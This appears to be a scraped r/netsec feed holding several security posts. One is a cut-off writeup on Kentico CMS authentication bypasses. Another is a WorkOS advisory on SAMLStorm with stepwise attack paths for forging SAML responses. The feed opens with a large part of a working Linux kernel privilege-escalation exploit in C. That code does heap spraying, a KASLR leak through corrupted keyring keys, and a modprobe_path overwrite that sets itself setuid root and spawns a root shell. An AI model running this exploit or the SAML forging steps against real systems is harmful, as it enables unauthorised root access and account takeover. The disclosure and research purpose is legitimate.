= fork();\n    if (!pid)\n        spray_cmd_handler();\n    else {\n        printf(\"[+] Kicked off spray process %d\\n\", pid);\n        return pid;\n    }\n}\n\n/* Spray pages in different size for various usages and trigger first OOB */\nvoid prepare_pgv_pages_cross_oob(void)\n{\n#ifdef DEBUG_CROSSCACHE\n    print_contiginfo();\n    print_buddyinfo();\n#endif    \n    /*\n     * We want a more clear and continuous memory there, which require us to\n     * make the noise less in allocating order-3 pages.\n     * So we pre-allocate the pages for those noisy objects there.\n     */\n    puts(\"[*] spray pgv order-0 pages...\");\n    for (int i = 0; i &lt; PGV_1PAGE_SPRAY_NUM; i++) {\n        if (alloc_page(i, 0x1000, 1) &lt; 0)\n            printf(\"[-] failed to create %d socket for pages spraying!\\n\", i);\n    }\n#ifdef DEBUG_CROSSCACHE\n    print_contiginfo();\n    print_buddyinfo();\n#endif    \n\n\n    puts(\"[*] spray pgv order-1 pages...\");\n    for (int i = 0; i &lt; PGV_1PAGE_SPRAY_NUM; i++) {\n        if (alloc_page(i, 0x1000 * 2, 1) &lt; 0)\n            printf(\"[-] failed to create %d socket for pages spraying!\\n\", i);\n    }\n\n#ifdef DEBUG_CROSSCACHE\n    print_contiginfo();\n    print_buddyinfo();\n#endif\n    puts(\"[*] spray pgv order-2 pages...\");\n    for (int i = 0; i &lt; PGV_4PAGES_SPRAY_NUM; i++) {\n        if (i == 2) {\n            /* This looks arbitrary AF, but I made a bunch of measurements and undergrad level stats that support it */\n            usleep(166000);\n\n            printf(\"[+] UNIX timestamp at page-2 splitting: %lld\\n\", get_precise_time());\n            trigger_oob();\n        }\n\n        if (alloc_page(PGV_4PAGES_START_IDX + i, 0x1000 * 4, 1) &lt; 0)\n            printf(\"[-] failed to create %d socket for pages spraying!\\n\", i);\n    }\n\n#ifdef DEBUG_CROSSCACHE\n    print_contiginfo();\n    print_buddyinfo();\n#endif\n\n    /* Spray 8 pages for page-level heap fengshui */\n    puts(\"[*] spray pgv order-3 pages...\");\n    for (int i = 0; i &lt; PGV_8PAGES_SPRAY_NUM; i++) {\n        /* A socket need 1 obj: sock_inode_cache, 19 objs for 1 slub on 4 page*/\n        if (i % 19 == 0)\n            free_page(pgv_4pages_start_idx++);\n\n        /* A socket need 1 dentry: dentry, 21 objs for 1 slub on 1 page */\n        if (i % 21 == 0)\n            free_page(pgv_1page_start_idx += 2);\n\n        /* A pgv need 1 obj: kmalloc-8, 512 objs for 1 slub on 1 page*/\n        if (i % 512 == 0)\n            free_page(pgv_1page_start_idx += 2);\n\n        if (alloc_page(PGV_8PAGES_START_IDX + i, 0x1000 * 8, 1) &lt; 0)\n            printf(\"[-] failed to create %d socket for pages spraying!\\n\", i);\n    }\n#ifdef DEBUG_CROSSCACHE    \n    print_contiginfo();\n    print_buddyinfo();\n#endif    \n}\n\nuint64_t parse_leak(uint8_t *buffer, uint32_t buffer_size)\n{\n    int success;\n    uint64_t kaslr_base_found;\n/*\n    for (uint32_t i = 0; i &lt; buffer_size; i++)\n        printf(\"%02x\", buffer[i]);\n    printf(\"\\n\");\n*/    \n    success = 0;\n\n    /* Process the buffer to find pointer triples and calculate KASLR base */\n    find_pointer_triples(buffer, buffer_size, &amp;success, &amp;kaslr_base_found);\n    if (!success)\n        do_error_exit(\"Could not recover KASLR base\\n\");\n\n    return kaslr_base_found;\n}\n\nvoid spray_tty_struct(int max)\n{\n    int spray[100];\n\n    printf(\"[+] Spraying tty_structs\\n\");\n\n    for (int i = 0; i &lt; max; i++) {\n        spray[i] = open(\"/dev/ptmx\", O_RDONLY | O_NOCTTY);\n    }\n}\n\n\nkey_serial_t *spray_keyring(uint32_t spray_size, uint32_t offset)\n{\n    char key_desc[KEY_DESC_MAX_SIZE];\n    key_serial_t *id_buffer = calloc(spray_size, sizeof(key_serial_t));\n\n    if (id_buffer == NULL)\n        do_error_exit(\"calloc\");\n\n    printf(\"[+] Spraying keys...\");\n    for (uint32_t i = 0; i &lt; spray_size; i++) {     \n        snprintf(key_desc, KEY_DESC_MAX_SIZE, \"attilaszia-%d%498d\", offset + i, offset + i);\n\n        id_buffer[i] = add_key(\"user\", key_desc, key_desc, strlen(key_desc), KEY_SPEC_PROCESS_KEYRING);\n        if (id_buffer[i] &lt; 0)\n            do_error_exit(\"add_key\");\n    }\n    printf(\"done\\n\");\n\n    return id_buffer;\n}\n\nuint64_t get_keyring_leak(key_serial_t *id_buffer, uint32_t id_buffer_size)\n{\n    uint8_t buffer[USHRT_MAX] = {0};\n    int32_t keylen;\n\n    printf(\"[+] Checking sprayed keys for corruption\\n\");\n    for (uint32_t i = 0; i &lt; id_buffer_size; i++) {\n\n        keylen = keyctl(KEYCTL_READ, id_buffer[i], (long)buffer, USHRT_MAX, 0);\n\n        if (keylen &lt; 0)\n            continue;\n\n        if (keylen &gt; 1024) {\n            printf(\"[+] Found corrupted key, triggering infoleak\\n\");\n            return parse_leak(buffer, keylen);\n        }\n    }\n    return 0;\n}\n\nvoid release_keys(key_serial_t *id_buffer, uint32_t id_buffer_size)\n{\n    printf(\"[+] Releasing %d keys\\n\", id_buffer_size);\n\n    for (uint32_t i = 0; i &lt; id_buffer_size; i++) {\n        if (keyctl(KEYCTL_REVOKE, id_buffer[i], 0, 0, 0) &lt; 0)\n            perror(\"keyctl(KEYCTL_REVOKE)\");\n        if (keyctl(KEYCTL_UNLINK, id_buffer[i], KEY_SPEC_PROCESS_KEYRING, 0, 0) &lt; 0)\n            perror(\"keyctl(KEYCTL_UNLINK)\");\n    }\n\n    free(id_buffer);\n}\n\n\nint qemu_mount_oracle(char *file_path, char *loop_device_path, char *mount_point)\n{\n    char command[1024];\n    snprintf(command, sizeof(command), \"/qemu_oracle mount %s %s %s\", file_path, loop_device_path, mount_point);\n    system(command);\n\n    return 0;\n}\n\nint qemu_umount_oracle(char *file_path, char *loop_device_path, char *mount_point)\n{\n    char command[1024];\n    snprintf(command, sizeof(command), \"/qemu_oracle unmount %s %s %s\", file_path, loop_device_path, mount_point);\n    system(command);\n\n    return 0;\n}\n\nvoid set_myself_suid(char *my_path)\n{\n    char *script = malloc(0x200);\n    char *modprobe_path = read_modprobe_content();\n\n    sprintf(script, \"#!/bin/bash\\nchown root:root %s\\nchmod u+s %s\\n\", my_path, my_path);   \n    write_file(modprobe_path, script, strlen(script));\n\n    sprintf(script, \"chmod 700 %s\\n\", modprobe_path);\n    system(script);\n\n    write_file(\"/tmp/z\", \"\\xff\\xff\\xff\\xff\\xff\\xff\\0\", 6);\n    system(\"chmod 700 /tmp/z\");\n\n    // Trigger modprobe_path\n    system(\"/tmp/z 2&gt;/dev/null\");\n    printf(\"[+] setuid bit set\\n\");\n}\n\nint main(char *argc, char **argv)\n{\n    key_serial_t *id_buffer;\n    char *xattr_target_filename;\n    struct write4_payload payload;\n    pthread_t monitor_thread;\n    pid_t pid;\n    int status; \n\n/* Root shell part */    \n    uid_t euid = geteuid(); \n\n    if (euid == 0)\n    {\n        // Got root!\n        printf(\"[+] Popping root shell, courtesy of @4ttil4sz1a\\n\");\n\n        setuid(0);\n        setgid(0);\n        char *args[] = {\"/bin/sh\", NULL};\n        execve(\"/bin/sh\", args, NULL);\n\n        return 0;\n    }   \n\n        char *dir_path = malloc(0x200);\n    getcwd(dir_path, 0x200);\n    char *path = malloc(PATH_MAX);\n    readlink(\"/proc/self/exe\", path, PATH_MAX - 1);\n    printf(\"[+] Running at %s\\n\", path);\n\n\n    sem_t *sem_pop_shell = make_semaphore(0);\n\n    if(!fork()){\n            sem_wait(sem_pop_shell);\n            char *args[] = {path, NULL};\n            execve(path, args, NULL);\n        }\n\n/* Initialization */    \n\n    set_cpu_affinity(0, 0);\n\n    printf(\"[+] Running as UID=%d, GID=%d\\n\", getuid(), getgid());\n\n    prepare_mounts();\n\n/* KASLR leak part */    \n\n    prepare_filesystem(hack_hfs_keyring, \"/tmp/malformed_ring.raw\", 0);\n\n    qemu_mount_oracle(\"/tmp/malformed_ring.raw\", \"/dev/loop1\", \"/tmp/mnt0/\");\n\n\n#ifdef DEBUG_CROSSCACHE\n    if (pthread_create(&amp;monitor_thread, NULL, monitor_function, NULL) != 0)\n        do_error_exit(\"Failed to create the monitor thread\");\n#endif\n\n\n    id_buffer = spray_keyring(SPRAY_KEY_SIZE_INIT, 0);\n\n    spray_tty_struct(SPRAY_TTY_INITIAL);\n\n    pid = prepare_pgv_system();\n\n    prepare_pgv_pages_cross_oob();\n\n    release_keys(id_buffer, SPRAY_KEY_SIZE_INIT);\n\n    exit_child();\n\n    waitpid(pid, &amp;status, 0);\n\n    printf(\"[+] Waitpid status %d\\n\", status);\n\n/* LPE part */\n\n    prepare_filesystem(hack_hfs_modprobe_one, \"/tmp/malformed_mod_1.raw\", kaslr_base_recovered);\n\n    qemu_mount_oracle(\"/tmp/malformed_mod_1.raw\", \"/dev/loop2\", \"/tmp/mnt1/\");\n\n    prepare_filesystem(hack_hfs_modprobe_two, \"/tmp/malformed_mod_2.raw\", kaslr_base_recovered);\n\n    qemu_mount_oracle(\"/tmp/malformed_mod_2.raw\", \"/dev/loop3\", \"/tmp/mnt2/\");\n\n    unshare_setup_xattr(getuid(), getgid());\n\n    printf(\"UID: %d, GID: %d\\n\", getuid(), getgid());\n\n    prepare_tmpfs();\n\n    spray_xattr();  \n\n     trigger_oob_xattr();\n\n    check_for_modprobe_overwrite_one(); \n\n    spray_xattr_two();\n\n    trigger_oob_xattr_two();\n\n    check_for_modprobe_overwrite_two(); \n\n    set_myself_suid(path);\n\n    printf(\"[+] Escalating privileges\\n\");\n\n    sem_post(sem_pop_shell);\n    wait(NULL);\n    sleep(0x100000);    \n}</pre>","contentLength":114020,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1je3w9o/learn_how_an_outofbounds_write_vulnerability_in/"},{"title":"SAMLStorm: Critical Authentication Bypass in xml-crypto and Node.js libraries","url":"https://workos.com/blog/samlstorm","date":1742218380,"author":"/u/Smooth-Loquat-4954","guid":957,"unread":true,"content":"<p>On Tuesday, March 4, 2025, WorkOS received a critical security report from researcher Alexander Tan (<a href=\"https://hackerone.com/ahacker1/\">ahacker1</a>) detailing a zero-day vulnerability in the widely used  and SAML libraries in the Node.js ecosystem. This flaw allows attackers to forge SAML authentication responses, potentially granting unauthorized access to any user account in affected applications—including admin accounts—without any user interaction. If exploited, this vulnerability could enable full account takeovers across organizations relying on SAML-based single sign-on (SSO).</p><p>WorkOS immediately mobilized its security and engineering teams, following an established incident response process to assess the risk and deploy a fix. <strong>Within 24 hours, WorkOS had patched the vulnerability for all customers, ensuring no WorkOS-integrated applications remained exposed. A thorough review of system logs confirmed no evidence of past compromise affecting WorkOS customers.</strong></p><p>To further protect the broader cloud ecosystem, WorkOS proactively worked with other identity platforms, various startups, and library maintainers, to accelerate remediation efforts across the industry.</p><p>The SAMLStorm vulnerability affects the  Node.js library (v6.0.0 and earlier, <a href=\"https://github.com/node-saml/xml-crypto/security/advisories/GHSA-x3m8-899r-f7c3\">CVE-2025-29775</a> &amp; <a href=\"https://github.com/node-saml/xml-crypto/security/advisories/GHSA-9p8x-f768-wp2g\">CVE-2025-29774</a>), with a fix introduced in v6.0.1 and backported to v3.2.1 and v2.1.6. It also affects Node.js SAML implementations including , , , , , and others. Collectively these packages have over 500k weekly downloads. </p><p>Full technical details of this exploit, how it works, and remediation steps for non-WorkOS services are covered below.</p><h2>How this zero-day enables full account takeovers</h2><p>Before diving into the details of the SAML protocol and how this vulnerability works, it’s important to first outline the potential impact at a high level. </p><p>Any company providing SSO services via SAML that uses the  library is at risk. In the worst case, an external threat actor could forge arbitrary assertions for a SAML identity provider (IdP), potentially leading to full account takeovers within affected service providers depending on their security measures.</p><p>This exploit requires no user interaction, meaning an attacker could gain unauthorized access to the targeted application with escalated privileges.</p><h2>SAML basics: understanding the attack surface</h2><p>There are two similar but distinct vulnerabilities in  represented by <a href=\"https://github.com/node-saml/xml-crypto/security/advisories/GHSA-x3m8-899r-f7c3\">CVE-2025-29775</a> &amp; <a href=\"https://github.com/node-saml/xml-crypto/security/advisories/GHSA-9p8x-f768-wp2g\">CVE-2025-29774</a>, the first which is exploitable via node-saml and the second which is not. For brevity, this post focuses only on the vulnerability and exploitation vector that affect usage of node-saml, and which were initially reported to WorkOS.</p><p>To understand this vulnerability, we first need to understand a bit about how SAML works.</p><ol role=\"list\"><li>A user attempts to access the service provider.</li><li>The service provider creates an XML-based SAML request.</li><li>The browser redirects to the IdP with the SAML request.</li><li>The IdP processes the SAML request and asks the user to authenticate.</li><li>The IdP generates a SAML response with an assertion and returns it to the browser. In SAML, assertions are used to communicate details about an identity.</li><li>The browser forwards the SAML response with the assertion back to the service provider. In the exploit, this is the step where the SAML response would be forged.</li><li>The service provider validates the SAML response and returns the authentication context to the browser if valid.</li></ol><p>Here is what a normal SAML response looks like:</p><pre contenteditable=\"false\"><code>    ...\n                    ...\n            ...\n        ...\n</code></pre><h2>How an attacker would exploit this vulnerability</h2><p>There are a few general conditions that must be met to exploit a service provider:</p><ol role=\"list\"><li>The service provider must be using xml-crypto.</li><li>The attacker needs any valid signature and digest pair from an identity provider.</li><li>The service provider needs to trust the identity provider’s certificate in its SAML configuration.</li><li>The attacker needs access to the ACS URL, SP Entity ID, and IdP Entity ID:<ol role=\"list\"><li>ACS URL – The endpoint where the Identity Provider sends its authentication response.</li><li>SP Entity ID – A URI that identifies the audience of the SAML response.</li><li>IdP Entity ID – A URI that identifies the issuer of the SAML response.</li></ol></li></ol><p>These conditions lead to the following exploitation scenarios:</p><h3>Attack path 1: full access without an account</h3><p>How the attack works for a threat actor without an identity in the identity provider:</p><ol role=\"list\"><li>Go to the target app using an email that redirects to an identity provider with publicly signed metadata. Note that this is not a security vulnerability in these identity providers—they simply provide information that an attacker could use to exploit the flaw in .</li><li>When attempting to sign in, a SAML request will be issued, from which you can pull the ACS URL and SP Entity ID, which is necessary to craft the SAML response</li><li>Pull the certificate and signature info, as well as the IdP Entity ID, from the public metadata</li><li>Craft a SAML response with the certificate and signed value from metadata</li><li>Modify the SAML assertion</li><li>Recalculate the DigestValue and insert it as comment before the existing digest value within the DigestValue node</li><li>Send a request with the crafted SAML response to the ACS URL</li><li>The service provider validates the response, and you’ve authenticated</li></ol><p>Note this exploitation scenario partially relies on the SP-initiated flow to get the ACS URL and SP Entity ID, but sometimes ACS URLs and SP Entity IDs are predictable and documented.Here is what a tampered SAML response might look like:</p><pre contenteditable=\"false\"><code>    ...\n                    ...\n            ...\n        ...\n</code></pre><h3>Attack path 2: abusing legitimate access for privilege escalation</h3><p>There’s a variation of this attack that affects all service providers using , regardless of whether signed public metadata is available. However, it requires the attacker to have an identity in the identity provider and at least one provisioned app.</p><ol role=\"list\"><li>Attempt to log in to the service provider using either the IdP or SP-initiated flows</li><li>Intercept the request to the ACS URL containing the SAML response</li><li>Modify the SAML assertion as needed</li><li>Recalculate the SAML assertion digest and insert the new digest value as a comment in the SAML Signature DigestValue node</li><li>Replace the SAML response in the request with your crafted SAML response</li><li>Forward the request to ACS URL</li><li>The service provider validates the response, and you’ve authenticated</li></ol><h2>Breaking the chain of trust: How xml-crypto fails</h2><p>This section explains the root cause of the vulnerability within the  library. Readers may note the presence of a common pattern in security vulnerabilities, where two components of a system disagree on how to interpret the same data.</p><p>For a SAML service provider to securely trust an assertion in a SAML response, it must validate the IdP’s cryptographic signature. This  starts with the IdP’s X.509 certificate, extends to the signature over a  block, includes the assertion digest within , and ultimately ends with the assertion itself.</p><p>The diagram below illustrates how the chain of trust is broken in the SAMLStorm attack.</p><p>In the  library, the assertion digest check ensures that the digest in the  block correctly corresponds to the assertion, while the signature check verifies that the signature is valid based on the IdP’s certificate and the  block. In normal operation, the signature protects an assertion from modification, because the assertion digest is included in the  block.</p><p>The core issue in this vulnerability is that these two checks evaluate the SAML document differently. SAML documents undergo , a process that removes XML comments. However, the assertion digest checks are performed on the  document (which retains comments), while the signature checks are performed on the  document (which strips comments). This mismatch creates an opportunity for exploitation via the insertion of a forged digest inside a comment, as shown below.</p><pre contenteditable=\"false\"><code></code></pre><p>In the vulnerable code, the SAML assertion digest check retrieves the  of the  node. Normally, this is the expected digest value, but an attacker can insert an XML comment containing a  of their own arbitrary assertion  the legitimate digest. As a result, the assertion digest check mistakenly uses the attacker’s digest.</p><p>Meanwhile, the signature check is performed on the  block  it has been . Since the malicious comment is stripped during canonicalization, only the original (legitimate) assertion digest remains, allowing the signature check to pass.</p><p>This breaks the  between the certificate and the assertion, enabling an attacker to forge arbitrary assertions that a vulnerable service provider will accept as valid.</p><h2>Understanding if your application may be impacted </h2><p>Any customer of a service provider using a vulnerable version of the  library is at risk, though the level of risk depends on the specific service provider and whether the threat actor has an identity within an identity provider (IdP). If the attacker has an identity from any IdP connected to the service provider, they can exploit this vulnerability against any SAML identity provider, as long as the service provider relies on .</p><p>If the threat actor does  have an identity within the IdP, they can still exploit this vulnerability—but only against identity providers that sign their provider metadata. Many major IdPs sign their provider metadata. While this is not a security vulnerability in these identity providers, it does expose information that an attacker could leverage to exploit the bug in .</p><p>If an application does not independently verify account ownership, a threat actor could forge authentication for  user within an organization, including admin users, and escalate privileges using SAML attributes or IdP group assignments. Additionally, if an application does not restrict which users an IdP is allowed to authenticate, an attacker could forge authentication for any user in the service provider’s application, regardless of organization boundaries.</p><h2>Recommendations for impacted organizations</h2><h3>Short-term recommendations </h3><p>WorkOS has already patched this vulnerability and confirmed that no systems or customers were affected. However, other non-WorkOS auth systems may still be at risk. We recommend the following steps:</p><ol role=\"list\"><li>Contact any applications where you authenticate via SAML SSO to ask if they were impacted and what risk remains.</li><li>Review audit logs in affected applications for any suspicious logins or activity.</li></ol><ol role=\"list\"><li>Check if your SAML implementation uses the  package.</li><li>If it does, review your SAML logs for signs of exploitation. Specifically, look for comments embedded in the  field of the response, for example:</li></ol><pre contenteditable=\"false\"><code></code></pre><h3>Long-term recommendations</h3><ol role=\"list\"><li>Regularly review your organization’s exposure to applications protected by SSO, and keep an up-to-date inventory of all such vendors, with security contact information for and notes about the type of data stored by each.</li><li>Choose vendors that support fully-featured security audit logging capabilities so you can independently review access to your data as needed.</li></ol><ol role=\"list\"><li>In general, checking that received data conforms to basic expectations before processing it serves as a valuable defense-in-depth mechanism against unknown vulnerabilities. Consider applying this principle to SAML responses to ensure their structure matches what is expected, especially for the certificates, signatures, and digests involved in the chain of trust. For example,  was unaffected by the exploitation vector in <a href=\"https://github.com/node-saml/xml-crypto/security/advisories/GHSA-9p8x-f768-wp2g\">CVE-2025-29774</a> because it checks whether the number of references in the  block matches the expected value of one before passing the response to  for further validation.</li></ol><h2><strong>WorkOS' rapid response timeline:</strong></h2><ul role=\"list\"><li> – Report received, immediate triage</li><li> – Full patch deployed, customers secured</li><li> – Industry-wide notifications sent to identity and auth vendors</li><li>– Public disclosure</li></ul><p>We would like to thank Alexander Tan (<a href=\"https://hackerone.com/ahacker1/\">ahacker1</a>) for his responsible disclosure and collaboration with the WorkOS Security Team. Special thanks also to <a href=\"https://securitylab.github.com/\">GitHub Security Lab</a>, <a href=\"https://www.latacora.com/\">Latacora</a>, and Chris Barth (maintainer of node-saml) for their contributions.</p><p>WorkOS is committed to proactive security and rapid response and was the first company to detect, patch, and disclose SAMLStorm. We continue leading in securing authentication infrastructure for customers including OpenAI, Cursor, Perplexity, Vercel, Plaid, and hundreds more. If you have a security report to share, please contact <a href=\"mailto:security@workos.com\">security@workos.com</a>.</p>","contentLength":12268,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jdcq48/samlstorm_critical_authentication_bypass_in/"},{"title":"[Tool] TruffleShow: A Client-Side Web Viewer for TruffleHog Outputs","url":"https://truffleshow.dev/","date":1742217456,"author":"/u/pelesenk","guid":958,"unread":true,"content":"<p>\n      A simple web viewer for TruffleHog JSON output.\n    </p><p>\n      Currently supported sources: </p><div x-show=\"!isFileUploaded\"><h2>\n        Upload TruffleHog JSON Output\n      </h2><div><p>\n          Pipe the output with  to fix broken JSON.\n          See <a href=\"https://github.com/trufflesecurity/trufflehog/issues/2164\" target=\"_blank\">#2164</a> for more.\n        </p></div></div>","contentLength":231,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jdcen1/tool_truffleshow_a_clientside_web_viewer_for/"},{"title":"Bypassing Authentication Like It’s The ‘90s - Pre-Auth RCE Chain(s) in Kentico Xperience CMS - watchTowr Labs","url":"https://labs.watchtowr.com/bypassing-authentication-like-its-the-90s-pre-auth-rce-chain-s-in-kentico-xperience-cms/","date":1742214352,"author":"/u/dx7r__","guid":940,"unread":true,"content":"<p>I recently joined watchTowr, and it is, therefore, time - time for my first watchTowr Labs blogpost, previously teased in a <a href=\"https://x.com/chudyPB/status/1884266270415376674?ref=labs.watchtowr.com\" rel=\"noopener noreferrer\">tweet</a> of a pre-auth RCE chain affecting some ‘unknown software’.</p><p>Joining the team, I wanted to maintain the trail of destruction left by the watchTowr Labs team, and so had to get my teeth into things quickly.</p><p>Two primary goals were clear:</p><ol><li>Look at something completely new - I quickly realized that I've never looked at any CMS solution, and so could be a fun good start.</li><li>Fulfill the ethos - pure pwnage, or don’t bother.</li></ol><p>Kentico’s Xperience CMS stood out as promising, fulfilling several key criteria:</p><ul><li>Written in C# (a familiar language, thank you Exchange).</li><li>Used and leveraged widely by watchTowr Platform customers.</li><li>Popular amongst large enterprises</li><li>A suspiciously minimal amount of critical/high-severity vulnerabilities in the past.</li><li>Attackers recognize the value of Kentico’s CMS - re: CVE-2019-10068 being exploited in the wild.</li></ul><p>This meets the criteria of something we’d define as “interesting,” so we began. A few hours later, (sigh), we stumbled into our first Authentication Bypass vulnerability.</p><p>Throughout this research, we identified the following vulnerabilities:</p><ul><li>WT-2025-0006 Authentication Bypass</li><li>WT-2025-0007 Post-Authentication Remote Code Execution</li><li>WT-2025-0011 Authentication Bypass</li></ul><p>As we walk through this analysis, we’ll take you on our journey that allowed us to build exploit chains to achieve Remote Code Execution against (at the time) fully patched Kentico Xperience CMS deployments.</p><p>Time to dive in… (and until next time..)</p><blockquote>Disclaimer: You are probably used to reading my heavily technical blog posts - this won’t change. However, the watchTowr Labs style is.. unique. Thus, expect memes, terrible jokes and a lot of poor humor woven in.</blockquote><p>Before we even start deep diving into the vulnerabilities, we want to be clear that the vulnerabilities highlighted in this blogpost <strong>do not affect every Kentico CMS installation (but do appear to affect common configurations)</strong>.</p><p>For the vulnerabilities we’re about to discuss, two requirements need to be fulfilled:</p><ul><li>The Staging (or ‘Sync’) Service needs to be enabled on the target (disabled by default).</li><li>The Staging Service needs to be configured with username/password authentication (as opposed to X.509-based authentication option, which is not affected).</li></ul><p>However, based on our dataset and exposure across the watchTowr client base, we can confidently say that the above requirements appear to be a common configuration - please do not write these weaknesses off as requiring edge cases. Reassuringly, this seriousness and severity was reflected in the vendors response - the Kentico security team treated all vulnerabilities seriously, and we’ll discuss this further later.</p><p>Our research, initially, was performed our initial research on Kentico Xperience 13.0.172.</p><ul><li>WT-2025-0006 was resolved in Kentico Xperience 13.0.173.</li></ul><p>We also found a second Authentication Bypass, while reviewing Kentico Xperience 13.0.173.</p><ul><li>WT-2025-0011 was resolved in Kentico Xperience 13.0.178.</li></ul><p>Although we never reviewed version 12 of Kentico Xperience (or below), we have high-confidence data that version 12 is also vulnerable to both WT-2025-0006 Authentication Bypass and WT-2025-0011 Authentication Bypass.</p><p>To get your system into a vulnerable position while you follow this post along at home, a Kentico administrative user can enable the Staging Service within the CMS settings functionality, while selecting the  authentication type, as presented in the next screenshot.</p><p>With this configuration complete, the next step is to investigate how this authentication is being performed. Let's dive into the technical details!</p><h3>WT-2025-0006 Authentication Bypass</h3><p>When we review new solutions, as we’ve described before a basic aim is to understand the exposed attack surface of the solution and quickly get a feel for how it has been architected.</p><p>In case of web applications, you may want to look for some REST- or SOAP-based APIs. Interestingly, Kentico’s Experience CMS does not expose a significant number of webservices and endpoints, presenting a relatively small attack surface.</p><p>However, a service called <code>CMS.Synchronization.WSE3.SyncServer</code> immediately caught our attention.</p><p>It exposes a single endpoint, and was interesting for two reasons:</p><ul><li>It performs (pre-hardened) -based deserialization (we later learned that it was hardened/patched as a result of CVE-2019-10068).</li><li><a href=\"https://docs.kentico.com/13/deploying-websites/content-staging?ref=labs.watchtowr.com\">Documentation</a> suggests that it may potentially allow you to gain full control over CMS pages.</li></ul><p>Sounds like fun! Let's try to send a simple HTTP request targeting this web method and just see what happens through the power of FAFO:</p><pre><code>POST /CMSPages/Staging/SyncServer.asmx HTTP/1.1\nHost: hostname\nContent-Type: text/xml; charset=utf-8\nContent-Length: 438\nSOAPAction: \"&lt;http://localhost/SyncWebService/SyncServer/ProcessSynchronizationTaskData&gt;\"\n\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;soap:Envelope xmlns:xsi=\"&lt;http://www.w3.org/2001/XMLSchema-instance&gt;\" xmlns:xsd=\"&lt;http://www.w3.org/2001/XMLSchema&gt;\" xmlns:soap=\"&lt;http://schemas.xmlsoap.org/soap/envelope/&gt;\"&gt;\n  &lt;soap:Body&gt;\n    &lt;ProcessSynchronizationTaskData xmlns=\"&lt;http://localhost/SyncWebService/SyncServer&gt;\"&gt;\n      &lt;stagingTaskData&gt;watchTowr&lt;/stagingTaskData&gt;\n    &lt;/ProcessSynchronizationTaskData&gt;\n  &lt;/soap:Body&gt;\n&lt;/soap:Envelope&gt;\n</code></pre><p>We’re presented with the following error message:</p><pre><code>&lt;faultstring&gt;Server was unable to process request. ---&amp;gt; Missing username token, please check authentication type&lt;/faultstring&gt;\n</code></pre><p>In the screenshot above presenting the definition of , you may have noticed a mysterious  attribute.</p><p>Its full class name is <code>Microsoft.Web.Services3.PolicyAttribute</code>, and it's implemented in <code>Microsoft.Web.Services3.dll</code>. We've never heard of this DLL before, and so found ourselves scratching our heads a little here.</p><p>A quick Google search revealed that this is part of obsolete (probably since 2012) Web Services Enhancement 3.0 for Microsoft .NET. This is likely superseded by .NET WCF, but it's easy to get confused here and thus looked like an interesting item to further examine.</p><p>A brief investigation showed that we are dealing with  - an extension to SOAP which is supposed to add a security layer to the protocol.</p><p>Sounds complex, but it’s not, and should be enough to extend our SOAP body with the appropriate SOAP header (see  tag):</p><pre><code>POST /CMSPages/Staging/SyncServer.asmx HTTP/1.1\nHost: hostname\nContent-Type: text/xml; charset=utf-8\nContent-Length: 868\nSOAPAction: \"&lt;http://localhost/SyncWebService/SyncServer/ProcessSynchronizationTaskData&gt;\"\n\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;soap:Envelope xmlns:xsi=\"&lt;http://www.w3.org/2001/XMLSchema-instance&gt;\" xmlns:xsd=\"&lt;http://www.w3.org/2001/XMLSchema&gt;\" xmlns:soap=\"&lt;http://schemas.xmlsoap.org/soap/envelope/&gt;\"&gt;\n  &lt;soap:Header&gt;\n    &lt;wsse:Security xmlns:wsse=\"&lt;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd&gt;\"&gt;\n      &lt;wsse:UsernameToken&gt;\n        &lt;wsse:Username&gt;watchTowr&lt;/wsse:Username&gt;\n        &lt;wsse:Password Type=\"&lt;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordText&gt;\"&gt;watchTowr&lt;/wsse:Password&gt;\n      &lt;/wsse:UsernameToken&gt;\n    &lt;/wsse:Security&gt;\n  &lt;/soap:Header&gt;\n  &lt;soap:Body&gt;\n    &lt;ProcessSynchronizationTaskData xmlns=\"&lt;http://localhost/SyncWebService/SyncServer&gt;\"&gt;\n      &lt;stagingTaskData&gt;watchTowr&lt;/stagingTaskData&gt;\n    &lt;/ProcessSynchronizationTaskData&gt;\n  &lt;/soap:Body&gt;\n&lt;/soap:Envelope&gt;\n</code></pre><p>We define a , which consists of both  and  values.</p><p>Now, we need to know how the credentials are being identified. The entire token verification is implemented in the <code>Microsoft.Web.Services3.Security.Tokens.UsernameTokenManager</code> class.</p><p>Three critical methods are defined here which are of interest to us:</p><ul><li>, which triggers the entire token verification procedure.</li><li>, which is supposed to retrieve a valid password for the given username.</li><li>, which is supposed to compare our password with the password retrieved from the .</li></ul><p>However, developers are welcome to do whatever they want with computers, including extending the  and overriding methods in order to customize the procedure.</p><p>This is what Kentico does with its <code>CMS.Synchronization.WSE3.WebServiceAuthorization</code> class:</p><pre><code>namespace CMS.Synchronization.WSE3\n{\n    public class WebServiceAuthorization : UsernameTokenManager\n    {\n        public override void VerifyToken(SecurityToken token)\n        {\n            if (StagingTaskRunner.ServerAuthenticationType(SiteContext.CurrentSiteName) == ServerAuthenticationEnum.UserName)\n            {\n                base.VerifyToken(token);\n            }\n        }\n    //...\n}\n</code></pre><p>In the above snippet, we can see that the overridden  calls it’s parent equivalent when dealing with username/password-based authentication.</p><p>Back to the <code>UsernameTokenManager.VerifyToken</code> then!</p><pre><code>public override void VerifyToken(SecurityToken token)\n{\n    if (token == null)\n    {\n        throw new ArgumentNullException(\"token\");\n    }\n    UsernameToken usernameToken = token as UsernameToken;\n    if (usernameToken == null)\n    {\n        throw new ArgumentException(SR.GetString(\"WSE561\", new object[]\n        {\n            typeof(UsernameToken).FullName\n        }), \"token\");\n    }\n    string text = this.AuthenticateToken(usernameToken); // [1]\n    if (text == null || text.Length == 0)\n    {\n        UsernameToken usernameToken2 = this.TokenCache[usernameToken.Username] as UsernameToken;\n        if (usernameToken2 != null &amp;&amp; usernameToken2 != null &amp;&amp; usernameToken2.Password != null &amp;&amp; usernameToken2.Password.Length &gt; 0)\n        {\n            text = usernameToken2.Password;\n        }\n    }\n    this.VerifyPassword(usernameToken, text); 